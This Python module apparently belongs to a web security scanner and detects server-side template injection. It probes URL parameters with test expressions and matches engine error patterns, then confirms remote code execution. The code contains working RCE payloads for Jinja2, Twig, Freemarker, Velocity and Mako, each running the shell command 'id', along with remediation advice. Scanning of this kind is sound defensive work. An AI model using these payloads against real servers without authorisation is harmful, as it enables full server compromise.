"""
Server-Side Template Injection (SSTI) Detection Module (v1.5.0)
OWASP A03:2025 - Injection | CVSS up to 9.8 (RCE)

How attackers exploit SSTI:
  Template engines (Jinja2, Twig, Freemarker, Velocity, Mako, Pebble, etc.)
  process templates mixing static HTML with dynamic expressions. When user
  input is CONCATENATED into a template string instead of being passed as DATA,
  the engine evaluates the attacker's input as code.

  Attack flow:
  1. Probe: inject {{7*7}} — if "49" appears, template evaluation confirmed
  2. Identify engine: different engines have different syntax
  3. Escalate to RCE: navigate Python/Java object hierarchy to execute OS commands
  4. Full compromise: read /etc/passwd, cloud credentials, environment variables

  Real-world cases:
  - Uber (2016): Jinja2 SSTI via email field → server credentials leaked
  - Shopify (2015): ERB SSTI in order notification templates
  - Multiple bug bounty payouts $5k-$25k for SSTI findings in 2024-2025

Engine fingerprinting:
  {{7*7}}     → 49   = Jinja2/Twig/Mako/Pebble (Python/PHP/Java)
  ${7*7}      → 49   = Freemarker/Velocity/Spring (Java), Mako
  #{7*7}      → 49   = Ruby ERB, Thymeleaf
  {{7*'7'}}   → 7777777 = Jinja2 (Python string multiplication)
  {{7*'7'}}   → 49   = Twig (PHP, treats as numeric)

References:
  - PortSwigger: https://portswigger.net/web-security/server-side-template-injection
  - PayloadAllTheThings: SSTI section
  - James Kettle's "Server-Side Template Injection" paper
"""

from __future__ import annotations
import re
from typing import List, Optional, Tuple
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
from webshield.core.models import Finding, Severity
from webshield.core.http import get_client


# ─── Detection Probes ─────────────────────────────────────────────────────────
# (payload, expected_output_pattern, engine_hint)
SSTI_PROBES: List[Tuple[str, str, str]] = [
    # Universal math — works in most engines
    ("{{7*7}}",          "49",       "Jinja2/Twig/Pebble"),
    ("${7*7}",           "49",       "Freemarker/Velocity/Mako"),
    ("#{7*7}",           "49",       "ERB/Thymeleaf"),
    ("<%= 7*7 %>",       "49",       "ERB/EJS"),
    ("{7*7}",            "49",       "Smarty"),
    ("{{7*'7'}}",        "7777777",  "Jinja2 (Python string mult)"),
    ("{{7*'7'}}",        "49",       "Twig (PHP numeric)"),
    # String concat
    ("{{\"hello\"}}",    "hello",    "Jinja2/Twig generic"),
    ("${'hello'}",       "hello",    "Groovy/Freemarker"),
    # Error-based — different error messages reveal engine
    ("{{config}}",       "<Config",  "Jinja2 (Flask config object)"),
    ("{{self}}",         "TemplateReference", "Jinja2"),
    # Freemarker
    ("${\"freemarker\".toUpperCase()}", "FREEMARKER", "Freemarker"),
    # Velocity
    ("#set($x=7*7)$x",  "49",       "Velocity"),
    # Smarty
    ("{math equation=\"7*7\"}", "49", "Smarty"),
]

# ─── Engine Error Patterns ────────────────────────────────────────────────────
ENGINE_ERRORS: List[Tuple[re.Pattern, str]] = [
    (re.compile(r"jinja2\.exceptions", re.I),              "Jinja2"),
    (re.compile(r"TemplateSyntaxError", re.I),             "Jinja2/Django"),
    (re.compile(r"freemarker\.core\.", re.I),              "Freemarker"),
    (re.compile(r"FreeMarker template error", re.I),       "Freemarker"),
    (re.compile(r"org\.apache\.velocity", re.I),           "Velocity"),
    (re.compile(r"com\.hubspot\.jinjava", re.I),           "Jinjava"),
    (re.compile(r"Twig_Error", re.I),                      "Twig"),
    (re.compile(r"smarty error", re.I),                    "Smarty"),
    (re.compile(r"pebble\.error", re.I),                   "Pebble"),
    (re.compile(r"groovy\.lang\.", re.I),                  "Groovy"),
    (re.compile(r"thymeleaf\.", re.I),                     "Thymeleaf"),
    (re.compile(r"ERB::SyntaxError", re.I),                "Ruby ERB"),
    (re.compile(r"ActionView::Template::Error", re.I),     "Rails ERB"),
]

# ─── RCE Confirmation Payloads (engine-specific) ─────────────────────────────
# Only used to confirm after detection — shows actual impact
RCE_PAYLOADS: List[Tuple[str, str, str]] = [
    # Jinja2 RCE — access OS via Python object hierarchy
    (
        "{{''.__class__.__mro__[1].__subclasses__()[396]('id',shell=True,stdout=-1).communicate()[0].strip()}}",
        r"uid=\d+",
        "Jinja2 RCE via subclass traversal"
    ),
    # Jinja2 RCE — config.from_pyfile (simpler)
    (
        "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}",
        r"uid=\d+",
        "Jinja2 RCE via __globals__"
    ),
    # Twig RCE
    (
        "{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}",
        r"uid=\d+",
        "Twig RCE via registerUndefinedFilterCallback"
    ),
    # Freemarker RCE
    (
        '<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}',
        r"uid=\d+",
        "Freemarker RCE via Execute class"
    ),
    # Velocity RCE
    (
        '#set($r=$class.inspect("java.lang.Runtime").type.getRuntime())#set($p=$r.exec("id"))#set($isr=$p.getInputStream())',
        r"uid=\d+",
        "Velocity RCE"
    ),
    # Mako RCE
    (
        "${__import__('os').popen('id').read()}",
        r"uid=\d+",
        "Mako RCE"
    ),
]


def _build_url(url: str, param: str, value: str) -> str:
    p = urlparse(url)
    params = {k: v[0] if isinstance(v, list) else v
              for k, v in parse_qs(p.query, keep_blank_values=True).items()}
    params[param] = value
    return urlunparse((p.scheme, p.netloc, p.path, p.params, urlencode(params), ""))


def _check_reflection(client, url: str, param: str, baseline: str) -> Optional[Tuple[str, str, str]]:
    """
    First test: does the param reflect input at all?
    Returns (probe, expected, engine) if SSTI detected, else None.
    """
    for (payload, expected, engine) in SSTI_PROBES:
        try:
            resp = client.get(_build_url(url, param, payload))
            body = resp.text
            if body == baseline:
                continue
            # Check if expected output appears (template evaluated the expression)
            if expected in body and expected not in baseline:
                return (payload, expected, engine)
            # Check for engine error messages (also confirms SSTI)
            for (pattern, eng) in ENGINE_ERRORS:
                if pattern.search(body) and not pattern.search(baseline):
                    return (payload, f"[error: {eng}]", eng)
        except Exception:
            continue
    return None


def _try_rce_confirmation(client, url: str, param: str) -> Optional[Tuple[str, str]]:
    """
    Attempt RCE confirmation — only after SSTI is already detected.
    Returns (payload, evidence) if RCE confirmed.
    """
    for (payload, pattern, label) in RCE_PAYLOADS:
        try:
            resp = client.get(_build_url(url, param, payload))
            if re.search(pattern, resp.text):
                snippet = resp.text[:200]
                return (payload, snippet)
        except Exception:
            continue
    return None


def _check_error_reveal(client, url: str, param: str, baseline: str, findings: List[Finding]) -> None:
    """Test if SSTI payloads reveal engine errors (error-based detection)."""
    error_triggers = ["{{", "${", "<%=", "#{", "{{7/0}}"]
    for trigger in error_triggers:
        try:
            resp = client.get(_build_url(url, param, trigger))
            body = resp.text
            for (pattern, engine) in ENGINE_ERRORS:
                if pattern.search(body) and not pattern.search(baseline):
                    findings.append(Finding(
                        title=f"SSTI — Template Engine Error Exposed ({engine}) | param: {param}",
                        severity=Severity.HIGH,
                        description=(
                            f"Template injection payload triggered a {engine} error message. "
                            "While not confirmed RCE, the error confirms the template engine "
                            "is processing user input and reveals internal stack traces. "
                            "Further exploitation to RCE is likely possible."
                        ),
                        evidence=(
                            f"Parameter: {param}\n"
                            f"Trigger: {trigger!r}\n"
                            f"Engine detected: {engine}\n"
                            f"Error snippet: {body[:300]}"
                        ),
                        remediation=(
                            "Never pass user input as template string. "
                            "Pass it as template variable/context data instead."
                        ),
                        code_fix=(
                            "# ❌ VULNERABLE (Jinja2):\n"
                            "template = env.from_string(user_input)  # user input IS the template\n\n"
                            "# ✅ SAFE:\n"
                            "template = env.get_template('page.html')  # fixed template\n"
                            "result = template.render(name=user_input)  # user input is data"
                        ),
                        reference="https://portswigger.net/web-security/server-side-template-injection",
                        cvss=8.5,
                    ))
                    return
        except Exception:
            continue


def scan(url: str, timeout: float = 12.0) -> List[Finding]:
    findings: List[Finding] = []
    parsed = urlparse(url)
    params = list(parse_qs(parsed.query, keep_blank_values=True).keys())

    if not params:
        return []

    with get_client(timeout=min(timeout, 10.0)) as client:
        try:
            baseline_resp = client.get(url)
            baseline = baseline_resp.text
        except Exception:
            return []

        for param in params[:5]:
            # Phase 1: detection via mathematical evaluation
            result = _check_reflection(client, url, param, baseline)
            if result:
                payload, expected, engine = result
                is_error = expected.startswith("[error:")

                # Phase 2: attempt RCE confirmation
                rce = _try_rce_confirmation(client, url, param)

                if rce:
                    rce_payload, rce_evidence = rce
                    findings.append(Finding(
                        title=f"SSTI → RCE CONFIRMED ({engine}) | param: {param}",
                        severity=Severity.CRITICAL,
                        description=(
                            f"Server-Side Template Injection with confirmed Remote Code Execution "
                            f"on parameter '{param}' ({engine} engine). "
                            "The server executed an OS command ('id') and returned the output. "
                            "Attackers have FULL server control: read files, exfiltrate cloud credentials, "
                            "install backdoors, pivot to internal network."
                        ),
                        evidence=(
                            f"Parameter: {param}\n"
                            f"Detection payload: {payload!r} → '{expected}'\n"
                            f"RCE payload: {rce_payload[:80]}...\n"
                            f"RCE output: {rce_evidence}"
                        ),
                        remediation=(
                            "CRITICAL: Never pass user input as template code. "
                            "Only use user input as template variables. "
                            "Sandbox the template engine. Restrict dangerous classes."
                        ),
                        code_fix=(
                            "# ❌ VULNERABLE — user input becomes the template:\n"
                            "template_str = f'Hello {user_name}'  # if user_name={{...}}, RCE\n"
                            "result = jinja2_env.from_string(template_str).render()\n\n"
                            "# ✅ SAFE — user input is only data:\n"
                            "template = jinja2_env.get_template('greeting.html')\n"
                            "result = template.render(user_name=user_name)\n\n"
                            "# ✅ If dynamic templates required, use sandbox:\n"
                            "from jinja2.sandbox import SandboxedEnvironment\n"
                            "env = SandboxedEnvironment()  # restricts dangerous operations"
                        ),
                        reference="https://portswigger.net/web-security/server-side-template-injection",
                        cvss=9.8,
                    ))
                else:
                    severity = Severity.HIGH if is_error else Severity.CRITICAL
                    findings.append(Finding(
                        title=f"SSTI Detected ({engine}) | param: {param}",
                        severity=severity,
                        description=(
                            f"Server-Side Template Injection confirmed on parameter '{param}'. "
                            f"The payload '{payload}' was evaluated by the {engine} template engine "
                            f"(expected output '{expected}' found in response). "
                            "This is typically exploitable to Remote Code Execution."
                        ),
                        evidence=(
                            f"Parameter: {param}\n"
                            f"Payload: {payload!r}\n"
                            f"Expected: '{expected}' → found in response\n"
                            f"Likely engine: {engine}"
                        ),
                        remediation=(
                            "Never pass user input as a template string. "
                            "Use user input only as template context variables."
                        ),
                        code_fix=(
                            "# ❌ VULNERABLE:\n"
                            "rendered = Template(request.args['tpl']).render()  # SSTI\n\n"
                            "# ✅ SAFE:\n"
                            "rendered = env.get_template('safe.html').render(\n"
                            "    value=request.args['value']  # data, not code\n"
                            ")"
                        ),
                        reference="https://portswigger.net/web-security/server-side-template-injection",
                        cvss=9.8 if not is_error else 8.5,
                    ))
                return findings  # one SSTI per scan is enough

            # Phase 3: error-based detection
            _check_error_reveal(client, url, param, baseline, findings)
            if findings:
                return findings

    return findings
